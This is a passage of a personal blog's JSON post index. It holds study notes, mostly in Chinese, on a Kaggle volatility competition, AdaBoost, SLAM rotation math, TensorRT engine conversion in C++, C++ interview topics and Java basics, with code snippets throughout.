use WAP to compute log returns, and assuming that log returns have 0 meanThen the Code for LogReturn is as follows and add it to book table.Additionally we should expire the NaN row: 12345def LogReturn(WAP): return np.log(WAP)book_parquet['logreturn'] = LogReturn(book_parquet)#expire NaN itemsbook_parquet = book_parquet[~book_example['log_return'].isnull()] 5.Realized VolatilityVolatility is described as ‘the annualized standard deviation of one year’s LogReturn’$$\\sigma = \\sqrt{\\sum\\limits_t{r^2_{t-1,t}}}$$ For each stock data, we find that different stock have different volatility characteristics, So one column should be added as ‘stock_id’, using 12stock_id = ibook_parquet.loc[:,'stock_id'] = stock_id EvaluationThe evaluation metric is Root Mean Square Percentage Error, as:$$\\text{RMSPE} = \\sqrt{\\frac{1}{n} \\sum_{i=1}^{n} ((y_i - \\hat{y}_i)/y_i)^2}$$The formula above can be implemented as: 1234def RMSPE(yhat, data): y = data.get_label() elements = ((y - yhat) / y) ** 2 return float(np.sqrt(np.sum(elements) / len(y))) Method(s)I looked through the Discussion board, found most are using XGBoost and LightGBT, I get begin from DataProcessing module and the baseline is implemented with XGBoost, LightGBT will be done later. data processingFirst check how we should process the parquet file.Parquet is a columnar storage format available to any project in the Hadoop ecosystem, regardless of the choice of data processing framework, data model or programming language.Hoster provided code for process the columnar file.and, I’m goin to try to run this method and data on Spark, The code will be release later on github.Process code: 12 APIsyou can use https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html to see the feature importance of your model.","categories":[{"name":"kaggle","slug":"kaggle","permalink":"http://waynamigo.github.io/categories/kaggle/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"kaggle","slug":"kaggle","permalink":"http://waynamigo.github.io/tags/kaggle/"},{"name":"Boosting","slug":"Boosting","permalink":"http://waynamigo.github.io/tags/Boosting/"},{"name":"xgboost","slug":"xgboost","permalink":"http://waynamigo.github.io/tags/xgboost/"},{"name":"GBDT","slug":"GBDT","permalink":"http://waynamigo.github.io/tags/GBDT/"}]},{"title":"统计学习笔记(后篇)","slug":"2021-07-01-statics_note","date":"2021-06-30T16:00:00.000Z","updated":"2023-10-30T17:08:11.730Z","comments":true,"path":"2021/07/01/2021-07-01-statics_note/","link":"","permalink":"http://waynamigo.github.io/2021/07/01/2021-07-01-statics_note/","excerpt":"接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。","text":"接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。 BoostingBoosting类方法是将N个弱学习算法构建成一个相当于强学习算法的方法。例如用一套基本分类器按照不同的权重组合成一个强分类器，这些基本分类器之间有依赖关系，构成的最终分类器可以达到复杂的强分类器达到的效果，并且可以使用并行处理，时间效率比复杂模型更快。 在这里重点记录AdaBoost和XGBoost两个模型，也是实际应用中广泛使用的方法，最后会讨论效果和时间性能。 sklearn的ensemble里封装了AdaBoostClassifier/AdaBoostRegressor。 Boosting类的算法原理 boosting的基本思想是选取弱学习器，可以是各种算法组合在一起用，也可用n个相同的算法，设定不同超参数。 组合方式，并行方式（Voting），串行（Cascading)。区别在于，并行方式是每个弱学习器给自己的结果，串行方式是第i+1个弱学习器只在第i个的置信度结果不够高时，对上一级的结果进行预测。 AdaBoostAdaboost解决的问题Adaboosting如何实现自适应(适应弱分类器各自的训练误差率)，由权值D实现，那么： 每一轮如何改变训练数据的权值或者概率分布？ 提高被前一轮弱分类器错误分类的样本的权值，降低被正确分类样本的权值，权值改变依赖自己的权值更新策略，不同任务和训练集一般不同，必要时需要设计自己的更新策略 如何将N个弱学习模型组合成一个强学习模型 Adaboost采取加权voting，准确率误差小的学习器权重高，误差大的权重小 Adaboost算法流程&lt;!—&gt; &lt;—&gt; 1权重参数D，弱分类器个数 算法机制很容易理解，就拿李航那本书上的-1和1做分类的问题，拆分成 加法模型$f(x)=\\sum{\\beta_mb(x;\\gamma_m)}$ 损失函数 前向分布 1.加法模型是指：有一系列基函数，其中基函数的变量$x$和某种系数$\\gamma$，设有m次迭代，则每次迭代产生系数$\\gamma_m$和基函数的系数$\\beta_m$，产生$\\beta_mb(x;\\gamma_m)$，我们也可以把这个基函数成为分类器$G$，最终模型也可以写成$f(x)=\\sum{\\beta_mb(x;\\gamma_m)}=\\sum{\\alpha_mG(x)_m}$ 2.损失函数：由于含supervision，我们采取的损失函数可以采取大部分误差项或CE等损失函数3.前向分布计算 123456func[]for i in range(m): (beta,gamma) = argmin(sum(Loss(y,f(x)+beta*G(x,gamma)))) func[] = func[] + beta*G()res = func[](x) 在argmin的操作里，涉及到系数的计算，首先我们需要每次迭代时计算分类误差（以第m次迭代为例）$err_m=\\sum{w_{m,i}I(G_m(x)!=y)}$，那么$\\beta_m=0.5\\ln{\\frac{1-err_m}{err_m}}$,更新样本权重$D,w_{m+1,i}=\\frac{w_{m,i}}{Z_m}exp(-\\beta_mG_m(x)y_i),Z=\\sum{-\\beta_mG_m(x)y_i}$,为归一化因子。 123456789101112问题1.为什么不能用神经网络一类的强分类器。因为adaboost是梯度算法，若果弱分类器太强，则会陷入局部最优。问题2.当有不支持加权重的弱分类器时，如何解决。resampling样本问题3.权重的作用1.计算弱分类器的加权系数，训练弱分类器G2.问题4.与random forest的区别1.随机森林的每棵树独立做出决策，训练时没有先后顺序2.adaboost的tree中，每个G以上一个的结果为输 EM名词解释1.高斯混合分布，2.隐变量，从高斯混合分布产生的变量","categories":[{"name":"数学","slug":"数学","permalink":"http://waynamigo.github.io/categories/数学/"}],"tags":[{"name":"Boost","slug":"Boost","permalink":"http://waynamigo.github.io/tags/Boost/"},{"name":"AdaBoost","slug":"AdaBoost","permalink":"http://waynamigo.github.io/tags/AdaBoost/"},{"name":"XGBoost","slug":"XGBoost","permalink":"http://waynamigo.github.io/tags/XGBoost/"}]},{"title":"3D重建及其深度学习方法的相关论文解析","slug":"2021-05-13-3D视觉_三维重建_实习","date":"2021-05-12T16:00:00.000Z","updated":"2022-08-23T09:02:06.871Z","comments":true,"path":"2021/05/13/2021-05-13-3D视觉_三维重建_实习/","link":"","permalink":"http://waynamigo.github.io/2021/05/13/2021-05-13-3D视觉_三维重建_实习/","excerpt":"最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。","text":"最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。 SLAM框架视觉里程计（Visual Odometry）目前项目的硬件设备由单目相机获取信息，进而进行姿态估计、深度估计等计算。简单来说，VO是由相邻两张图片间像素的位置关系估计相机的位置， 坐标变换 旋转矩阵求相机坐标系（o）到世界坐标系（w）下的旋转矩阵$R^o_w$，进行欧式变换可以将o下的向量$p_o$ 转换到w下向量$p_w$求出刚体旋转矩阵$R^o_w$，那么w下向量$p_w$左乘R就可以转化到$p_o$:$p_o = R^o_w \\cdot\\ p_w$同理如果两个坐标系下的旋转矩阵可以得到$$m = $$eg. 下面是由w到o1 和o2两个旋转矩阵传递得到的o1 -&gt; o2的旋转矩阵设两个相机坐标系下o1,o2对应的三个点a b c，d e f，各获得两个向量 $m1,n1$,$m2,n2$分别构建出该点集合所在的坐标系方程，求解得到世界坐标到o1 , o2的旋转坐标$R_1,R_2$， 则有：世界坐标系向量$m2 = R_1^T \\cdot R_2 \\cdot m1$ 1234567891011121314151617181920212223242526272829def RigidBody_Transform(p=np.zeros((3,3),dtype=float), q=np.zeros((3,3),dtype=float)): # 世界坐标到 O1的旋转矩阵 ，x = x / ||x|| 单位化 x = (p[1,:] - p[0,:]) / np.linalg.norm(p[1,:] - p[0,:]) y = (p[2,:] - p[1,:]) - np.inner(np.inner((p[2,:] - p[1,:]),x), x) y = y / np.linalg.norm(y) # y_bar = y / ||y|| # 单位化第二行 print(&quot;x&quot;,x) print(&quot;y&quot;,y) z = np.cross(x, y) #叉乘 print(&quot;z&quot;,z) rotate_matrix_w2o1 = np.array([x, y, z]) # 世界坐标到 O2的转转矩阵 x_new = (q[1,:] - q[0,:]) / np.linalg.norm(q[1,:] - q[0,:]) y_new = (q[2,:] - q[1,:]) - np.inner(np.inner((q[2,:] - q[1,:]),x_new), x_new) y_new = y_new / np.linalg.norm(y_new) # 这里要注意，叉积（cross product）和 外积（outer product）不一样 # ps:国内教材讲的是叉积和外积一样 # np.cross算叉积 ，np.outer算外积 z_new = np.cross(x_new, y_new) #这要计算的是叉积（只有三维空间有意义，就是右手系的那个） rotate_matrix_w2o2 = np.array([x_new, y_new, z_new]) return rotate_matrix_w2o1,rotate_matrix_w2o2, (rotate_matrix_w2o1.T * rotate_matrix_w2o2)#p = np.array([(-47.34,-18.71,-155.02), (-73.64,-29.82,-210.88), (-64.88,-36.77,-216.15)])#p = np.array([(-4.34,-36.71,51), (-30,25.5,-4), (-21,18,-10.15)])#q = np.array([(-40,25.5,6), (-30,25.5,-4), (15.01,55.19,22.818)])p = np.array([(0,1,0), (0,0,0), (0,0,1)])q = np.array([(0,-1,0), (0,0,0), (0,0,-1)])m1,m2,rotate_matrix = RigidBody_Transform(p, q)print(&quot;rotate_matrix is:\\n&quot;)print(rotate_matrix) 旋转向量上面的旋转矩阵表示具有局限性，原因是求出的矩阵必须是正交阵，优化时比较困难，并且计算量比较大，需要进行矩阵运算，一次运算需要9次浮点乘法，所以又提出一个用旋转角和旋转轴表示一个旋转向量的描述旋转的方法。同时，旋转向量也可以转换成旋转矩阵:由罗德里格斯公式(Rodrigus’ Formula)，n_r 即n^，表示向量n到n对应的反对称矩阵的转换符，计算如下： $a \\times b=\\begin{Vmatrix} e_1&amp;e_2&amp;e_3\\\\a_1&amp;a_2&amp;a_3\\\\b_1&amp;b_2&amp;b_3 \\end{Vmatrix}=\\begin{bmatrix} a_2b_3-a_3b_2\\\\a_3b_1-a_1b_3\\\\a_1b_2-a_2b_1 \\end{bmatrix}=\\begin{bmatrix}0&amp;-a_3&amp;a_2\\\\a_3&amp;0&amp;-a_1\\\\ -a_2&amp;a_1&amp;0\\end{bmatrix} \\cdot b = a$^$b$上面的$a$^ 表示其对应的反对称矩阵$R = cos \\theta I + (1-cos\\theta) n \\cdot n^T + sin\\theta n$^求转角$\\theta$，可以：$tr(R)= \\cos\\theta tr(I) +(1-\\cos\\theta)tr(n \\cdot n^T) +\\sin\\theta tr(n$^$)$$\\quad\\quad =3\\cos\\theta +(1-\\cos\\theta) = 1+2\\cos\\theta$求出$\\theta = \\arccos \\frac{tr(R)-1}{2}$ 回环检测（Loop Closure Detection）判断镜头是否到达过先前位置，和后端（优化）解决因里程计每次计算相邻两张图片的位置关系，每次前后误差叠加出现的漂移问题，简而言之就是校正。 后端优化（非线性）接受VO获得的相机位姿、回环检测 建图还没整理好 3D点云模型相机模型相机模型得到的相机内参(camera_intrinsic_perview)一般为一张图得到一个通过两种模型针孔模型（PINHOLE，还有放射模型RADIAL），畸变模型两种实现内参计算","categories":[{"name":"3DPointCloud","slug":"3DPointCloud","permalink":"http://waynamigo.github.io/categories/3DPointCloud/"}],"tags":[{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://waynamigo.github.io/tags/DeepLearning/"},{"name":"3DVision","slug":"3DVision","permalink":"http://waynamigo.github.io/tags/3DVision/"},{"name":"3DPointCloud","slug":"3DPointCloud","permalink":"http://waynamigo.github.io/tags/3DPointCloud/"},{"name":"SLAM","slug":"SLAM","permalink":"http://waynamigo.github.io/tags/SLAM/"}]},{"title":"NeuralRecon for 3D reconstruction in real-time","slug":"2021-05-11-summary_neucon","date":"2021-05-10T16:00:00.000Z","updated":"2022-07-16T04:45:11.472Z","comments":true,"path":"2021/05/11/2021-05-11-summary_neucon/","link":"","permalink":"http://waynamigo.github.io/2021/05/11/2021-05-11-summary_neucon/","excerpt":"图像pair 提取特征点算法SIFTSURFORB","text":"图像pair 提取特征点算法SIFTSURFORB","categories":[{"name":"3D vision","slug":"3D-vision","permalink":"http://waynamigo.github.io/categories/3D-vision/"}],"tags":[{"name":"3DVision Projection TSDF","slug":"3DVision-Projection-TSDF","permalink":"http://waynamigo.github.io/tags/3DVision-Projection-TSDF/"}]},{"title":"DenseDescriptor for SfM Datasset Preparation","slug":"2021-04-20-DenseDescriptor","date":"2021-04-18T16:00:00.000Z","updated":"2022-07-16T04:45:09.741Z","comments":true,"path":"2021/04/19/2021-04-20-DenseDescriptor/","link":"","permalink":"http://waynamigo.github.io/2021/04/19/2021-04-20-DenseDescriptor/","excerpt":"一些单目三维重建的概念，及DepthEstimation代码的阅读","text":"一些单目三维重建的概念，及DepthEstimation代码的阅读 4-19日-4月21日123Colmap提取的数据，SFMDataset用来初始化ColMap提取SFM数据，作为训练数据集，读取及处理方式 SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性class:SFMDataset Format image_file_names 拆好的图像序列，有序folder_list data里面的文件夹train/data/1 train/data/2adjandance_range 1 50 邻接范围,控制1-50的随机增量image_downsampling 2.5 图像下采样倍数 resize到 原来的2.5xnetwork_downsampling 64 for downsample and crop mask的参数inlier_percentage 0.99 阈值ground truthload_intermediate_data True/False 是否加载预计算数据，存在precompute的pickle文件里precompute.pklintermediate_data_root precompute文件⬆️的pathsampling_size 10heatmap_sigma 5.0 热图参数，用于generate_heatmap_from_locations,生成训练的sourcemap和targetmappre_workers 4visible_interval 可视化间隔，，用在overlap点云的函数里，和读取colmapresult的函数一起预处理，避免点云密集，可以调整该参数控制稀疏程度。 num_iter 每个epoch的迭代次数，训练的时候在看 precompute.pkl 按作者计算的程序来吧，反正按路径来就没问题 crop_positions_per_seq selected_indexed_per_seq visible_view_indexes_per_seq point_cloud_per_seq intrinsic_matrix_per_seq mask_boundary_per_seq view_indexes_per_point_per_seq extrinsics_per_seq projection_per_seq clean_point_list_per_seq image_downsampling //这三个是 network_downsampling inlier_percentage // 符合ground trueth的阈值 estimated_scale_per_seq 使用tensorrt生成engine进行推理https://zhuanlan.zhihu.com/p/351426774c++ 写法、思路如下 先将pytorch的Network先转成onnx模型。如果使用DataParallel进行多GPU训练的话，需要注意节点前面的Module.注意版本，某些函数是onnx默认运算符集不支持的函数，比如forbenius norm，只能转成Aten运算符，Aten运算符竟然没找到很好的文档，为了避免风险升级pytorch到 1.6，将运算符集合版本导出为11，支持了现在的大多数函数 1code here 导出onnx在netron看一下，没问题就可以开始用C++转Trt模型，主要包括加载、解析onnx，序列化两个操作进行 12345678910111213141516171819202122std::string trtEngineName = \"out.engine\";sammple::Logger glogger; nvinfer1::IBuilder* builder = createInferBuilder(gLogger.getTRTLogger());//createInferBuilder(ILogger&amp; logger);INetWorkDefinition* network = builder-&gt;createNetWorkV2(maxBatchSize);//IBuilderConfig* config = builder-&gt;createBuilderConfig();auto parser =nvonnxparser::createParser(*network,gLogger.getTRTLogger());// a parser for onnxbuilder-&gt;setMaxWorkspaceSize(1_GiB);//NVIDIA document claims \"lets TensorRT pick any algorithm available.\"config-&gt;setMaxWorkspaceSize(1_GiB);builder-&gt; setFp16Mode(gArgs.runInFp16);//two inference mode, FP16 and Int8, Float16 is okaysamplesCommon::enableDLA(builder, config, gArgs.useDLACore);// DLA is to accelerate some layer // DALI to accelerate data readingICudaEngine* engine = builder-&gt;buildCudaEngine(*network);// build cudaengine of \"NvInferRuntime.h\"IHostMemory* trtModel = nullptr;// init stream as null pointtrtModel = engine -&gt;serialize(); // serialize the onnx modelstd::ofstream ofs(trtEngineName.c_str(), std::ios::out | std::ios::binary);ofs.write((char*)(trtModel-&gt;data()), trtModel-&gt;size());ofs.close(); 上一步导出的模型为out.engine，下一步加载该TRT model（或CudaEngine） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct TensorRT &#123; IExecutionContext* context; ICudaEngine* engine; IRuntime* runtime;&#125;;TensorRT* LoadNet(const char* trtFileName)&#123; std::ifstream t(trtFileName, std::ios::in | std::ios::binary); std::stringstream tempStream; tempStream &lt;&lt; t.rdbuf(); t.close(); DebugP(\"TRT File Loaded\"); tempStream.seekg(0, std::ios::end); const int modelSize = tempStream.tellg(); tempStream.seekg(0, std::ios::beg); void* modelMem = malloc(modelSize); tempStream.read((char*)modelMem, modelSize); IRuntime* runtime = createInferRuntime(gLogger); if (runtime == nullptr) &#123; DebugP(\"Build Runtime Failure\"); return 0; &#125; if (gArgs.useDLACore &gt;= 0) &#123; runtime-&gt;setDLACore(gArgs.useDLACore); &#125; ICudaEngine* engine = runtime-&gt;deserializeCudaEngine(modelMem, modelSize, nullptr); if (engine == nullptr) &#123; DebugP(\"Build Engine Failure\"); return 0; &#125; IExecutionContext* context = engine-&gt;createExecutionContext(); if (context == nullptr) &#123; DebugP(\"Build Context Failure\"); return 0; &#125; TensorRT* trt = new TensorRT(); trt-&gt;context = context; trt-&gt;engine = engine; trt-&gt;runtime = runtime; DebugP(\"Build trt Model Success!\"); return trt;&#125;","categories":[{"name":"3DPointCloud","slug":"3DPointCloud","permalink":"http://waynamigo.github.io/categories/3DPointCloud/"}],"tags":[{"name":"3DPointclouod","slug":"3DPointclouod","permalink":"http://waynamigo.github.io/tags/3DPointclouod/"},{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://waynamigo.github.io/tags/DeepLearning/"},{"name":"DepthEstimation","slug":"DepthEstimation","permalink":"http://waynamigo.github.io/tags/DepthEstimation/"}]},{"title":"跨媒体检索/多模态计算 方向动态","slug":"2021-04-08-图像视频信息提取与检索","date":"2021-04-07T16:00:00.000Z","updated":"2022-07-16T04:45:09.775Z","comments":true,"path":"2021/04/08/2021-04-08-图像视频信息提取与检索/","link":"","permalink":"http://waynamigo.github.io/2021/04/08/2021-04-08-图像视频信息提取与检索/","excerpt":"写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上根据项目需求，开发者可以将所需的识别、分割、生成、编码等方法集成到检索或推荐项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案当做参考。","text":"写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上根据项目需求，开发者可以将所需的识别、分割、生成、编码等方法集成到检索或推荐项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案当做参考。 多模态信息检索的挑战和攻克方向In fact, researchers and algorithm engineers in the field of information retrieval focus more on tasks such as data mining, feature representation, and analysis of user behavior. From the recent conferences like SIGIR and ACMMM, some research directions retrieved are as follows:2021 SIGIRBias and counterfactual learningRecommendationSearching and RankingSocial AspectsKnowledge StructuresQuestion AnsweringSequences and SessionsAdversarial Information RetrievalMulti-modal Information RetrievalMultiMedia Information RetrievalMulti-modal Fusion and Embedding2020 SIGIR As noticed, the main modalities are visual, texual, and acoustic. The challanges lie on Multimodal Fusion. Many problems in engeneer often comes to: Infor mation loss, hierachical structure transductive learningoptimal latent space, can maintance original intrinsic characteristics of microvideo in original space","categories":[{"name":"Multimodal","slug":"Multimodal","permalink":"http://waynamigo.github.io/categories/Multimodal/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"MultiMedia","slug":"MultiMedia","permalink":"http://waynamigo.github.io/tags/MultiMedia/"},{"name":"Recommendation","slug":"Recommendation","permalink":"http://waynamigo.github.io/tags/Recommendation/"}]},{"title":"CPP面试","slug":"2021-03-26-cpp面试","date":"2021-03-25T16:00:00.000Z","updated":"2022-07-16T04:45:11.763Z","comments":true,"path":"2021/03/26/2021-03-26-cpp面试/","link":"","permalink":"http://waynamigo.github.io/2021/03/26/2021-03-26-cpp面试/","excerpt":"持续更新","text":"持续更新 概念性区分1.C和C++的区别C面向过程，C++面向对象C的内存管理使用malloc free，C++还可以使用new deleteC不支持函数重载，C++支持函数重载C没有引用，C++可以用引用堆和栈的区别stack编译器自动分配和释放，自底向上的数据结构heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构c++中不能被继承的成员函数析构函数和构造函数const定义常量修饰函数参数和函数返回值 修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址–const优点const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查，后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。[全局变量放在静态存储区，整个程序开始分配内存，结束释放]staticstatic修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量static修饰的变量一开始就得初始化，并存放于静态内存区volatile本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容extern 指针和引用的区别引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的引用不能为NULL，指针可以引用做函数参数时，内部传递的是变量地址进程间通信pipe管道，半双工，用于父子进程通信semaphore信号量，进程同步访问共享资源message que 消息队列，克服了缓冲区限制shared memory共享内存socket线程间通信全局变量 Messages消息机制；CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信） 编译时运算符:sizeof 写一个函数指针( ( void ()() ) 0x100000) ( );void()()强制转换0x100000typedef void()() voidFunc;*( (voidFunc)0x100000 )(); 内存分配方式 从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。 在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。 从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。","categories":[{"name":"CPP","slug":"CPP","permalink":"http://waynamigo.github.io/categories/CPP/"}],"tags":[{"name":"CPP，面试","slug":"CPP，面试","permalink":"http://waynamigo.github.io/tags/CPP，面试/"}]},{"title":"","slug":"2021-02-01-Java复习笔记","date":"2021-02-24T11:50:18.000Z","updated":"2021-02-24T11:50:18.000Z","comments":true,"path":"2021/02/24/2021-02-01-Java复习笔记/","link":"","permalink":"http://waynamigo.github.io/2021/02/24/2021-02-01-Java复习笔记/","excerpt":"","text":"第一章 Java概述1.1 Java历史Java诞生于SUN（Stanford University Network），09年SUN被Oracle（甲骨文）收购。 Java之父是詹姆斯.高斯林(James Gosling)。 1996年发布JDK1.0版。 目前最新的版本是Java12。我们学习的Java8。 1.2 Java语言最主要的特点 特点一：面向对象 两个基本概念：类、对象 三大特性：封装、继承、多态 特点二：健壮性 吸收了C/C++语言的优点，但去掉了其影响程序健壮性的部分（如指针、内存的申请与释放等），提供了一个相对安全的内存管理和访问机制 特点三：跨平台性 跨平台性：通过Java语言编写的应用程序在不同的系统平台上都可以运行。“Write once , Run Anywhere”一次编写，处处运行。 原理：只要在需要运行 java 应用程序的操作系统上，先安装一个Java虚拟机 (JVM Java Virtual Machine) 即可。由JVM来负责Java程序在该系统中的运行。因为有了JVM，同一个Java 程序在三个不同的操作系统中都可以执行。这样就实现了Java 程序的跨平台性。 1557828366412 1.3 Java环境搭建1.3.1 JDK、JRE、JVMJava开发人员需要安装JDK。如果仅仅是运行Java程序，那么只需要按照JRE。 JDK（Java Development kits）：Java开发工具包。 JRE（Java Runtime Environment）：Java运行环境。 JVM（Java Virtual Machine）：Java虚拟机。 JDK = JRE + 开发工具（javac.exe,java.exe,javadoc.exe等） JRE = JVM + 核心类库（常用类：String、日期时间、数学、集合、IO、网络、多线程等） 1.3.2 Java环境搭建1、安装JDK 2、配置JDK的开发工具目录到path环境变量中 ​ 例如：D:\\ProgramFiles\\Java\\jdk1.8.0_51\\bin; ​ 注意：这个安装目录以你自己的安装目录为准 1553644724825 （1）为什么配置path？ ​ 希望在命令行使用javac.exe等工具时，任意目录下都可以找到这个工具所在的目录。 （2）如何配置环境变量？ ​ 【计算机】右键【属性】，选择【高级系统设置】，选择【高级】，选择【环境变量】，选择【系统环境变量】，编辑path，在【path原有值】的前面加入D:\\ProgramFiles\\Java\\jdk1.8.0_51\\bin; 1.4 第一个Java应用程序12345class HelloWorld&#123; public static void main(String[] args)&#123; System.out.print(\"Hello Java!\"); &#125;&#125; 1.4.1 Java程序的开发步骤三步： 1、编辑/编写源代码 要求：源文件必须是.java文件 2、编译 目的：把源文件编译为.class字节码文件（因为JVM只认识字节码） 工具：javac.exe 格式： 1javac 源文件名.java 3、运行 工具：java.exe 格式： 12java 类名java 字节码文件名 要求：可以被运行的类，必须包含main方法 1.4.2 Java程序的结构与格式结构： 12345类&#123; 方法&#123; 语句; &#125;&#125; 格式： （1）每一级缩进一个Tab键 （2）{}的左半部分在行尾，右半部分单独一行，与和它成对的”{“的行首对齐 1.4.3 Java程序的入口Java程序的入口是main方法 123public static void main(String[] args)&#123; &#125; 1.4.4 Java注释1、单行注释 1//注释内容 2、多行注释 123/*注释内容*/ 3、文档注释 123/**文档注释（后面注解部分讲解）*/ 1.5 编写Java程序时应该注意的问题1、字符编码问题 当cmd命令行窗口的字符编码与.java源文件的字符编码不一致，如何解决？ 1557881223916 解决方案一： ​ 在Notepad++等编辑器中，修改源文件的字符编码 1557881271819 解决方案二： ​ 在使用javac命令式，可以指定源文件的字符编码 1javac -encoding utf-8 Review01.java 2、大小写问题 （1）源文件名： ​ 不区分大小写，我们建议大家还是区分 （2）字节码文件名与类名 ​ 区分大小写 （3）代码中 ​ 区分大小写 3、源文件名与类名一致问题？ （1）源文件名是否必须与类名一致？public呢？ 如果这个类不是public，那么源文件名可以和类名不一致。 如果这个类是public，那么要求源文件名必须与类名一致。 我们建议大家，不管是否是public，都与源文件名保持一致，而且一个源文件尽量只写一个类，目的是为了好维护。 （2）一个源文件中是否可以有多个类？public呢？ 一个源文件中可以有多个类，编译后会生成多个.class字节码文件。 但是一个源文件只能有一个public的类。 （3）main必须在public的类中吗？ 不是。 但是后面写代码时，基本上main习惯上都在public类中。 第二章 Java的基础语法2.1 标识符简单的说，凡是程序员自己命名的部分都可以称为标识符。 即给类、变量、方法、包等命名的字符序列，称为标识符。 1、标识符的命名规则 （1）Java的标识符只能使用26个英文字母大小写，0-9的数字，下划线_，美元符号$ （2）不能使用Java的关键字（包含保留字）和特殊值 （3）数字不能开头 （4）不能包含空格 （5）严格区分大小写 2、标识符的命名规范 （1）见名知意 （2）类名、接口名等：每个单词的首字母都大写，形式：XxxYyyZzz， 例如：HelloWorld，String，System等 （3）变量、方法名等：从第二个单词开始首字母大写，其余字母小写，形式：xxxYyyZzz， 例如：age,name,bookName,main （4）包名等：每一个单词都小写，单词之间使用点.分割，形式：xxx.yyy.zzz， 例如：java.lang （5）常量名等：每一个单词都大写，单词之间使用下划线_分割，形式：XXX_YYY_ZZZ， 例如：MAX_VALUE,PI 2.2 变量2.2.1 变量的概念变量的作用：用来存储数据，代表内存的一块存储区域，变量中的值是可以改变的。 2.2.2 变量的三要素1、数据类型 2、变量名 3、值 2.2.3 变量的使用应该注意什么？1、先声明后使用 如果没有声明，会报“找不到符号”错误 2、在使用之前必须初始化 如果没有初始化，会报“未初始化”错误 3、变量有作用域 如果超过作用域，也会报“找不到符号”错误 4、在同一个作用域中不能重名 2.2.4 变量的声明和赋值、使用的语法格式？1、变量的声明的语法格式： 1234567数据类型 变量名;例如：int age;String name;double weight;char gender;boolean isMarry; 2、变量的赋值的语法格式： 1234567变量名 = 值;例如：age = 18;name = \"柴林燕\"; //字符串的值必须用\"\"weight = 44.4;gender = '女';//单字符的值必须使用''isMarry = true; 3、变量的使用的语法格式： 123456789通过变量名直接引用例如：(1)输出变量的值System.out.print(name);System.out.print(\"姓名：\" + name);//\"\"中的内容会原样显示System.out.print(\"name = \" + name);(2)计算age = age + 1; 2.3 数据类型2.3.1 Java数据类型的分类1、基本数据类型 ​ 8种：整型系列（byte,short,int,long）、浮点型(float,double)、单字符型（char）、布尔型（boolean） 2、引用数据类型 ​ 类、接口、数组、枚举….. 2.3.2 Java的基本数据类型1、整型系列 （1）byte：字节类型 占内存：1个字节 存储范围：-128~127 （2）short：短整型类型 占内存：2个字节 存储范围：-32768~32767 （3）int：整型 占内存：4个字节 存储范围：-2的31次方 ~ 2的31次方-1 （4）long：整型 占内存：8个字节 存储范围：-2的63次方 ~ 2的63次方-1 注意：如果要表示某个常量数字它是long类型，那么需要在数字后面加L 2、浮点型系列（小数） （1）float：单精度浮点型 占内存：4个字节 精度：科学记数法的小数点后6~7位 注意：如果要表示某个常量数字是float类型，那么需要在数字后面加F或f （2）double：双精度浮点型 占内存：8个字节 精度：科学记数法的小数点后15~16位 3、单字符类型 char：字符类型 占内存：2个字节 Java中使用的字符集：Unicode编码集 字符的三种表示方式： （1）’一个字符’ 例如：’A’，’0’，’尚’ （2）转义字符 1234567\\n：换行\\r：回车\\t：Tab键\\\\：\\\\&quot;：”\\&apos;：\\b：删除键Backspace （3）\\u字符的Unicode编码值的十六进制型 例如：\\u5c1a代表’尚’ 4、布尔类型 boolean：只能存储true或false 2.3.3 进制（了解，可以暂时忽略）1、进制的分类： （1）十进制 ​ 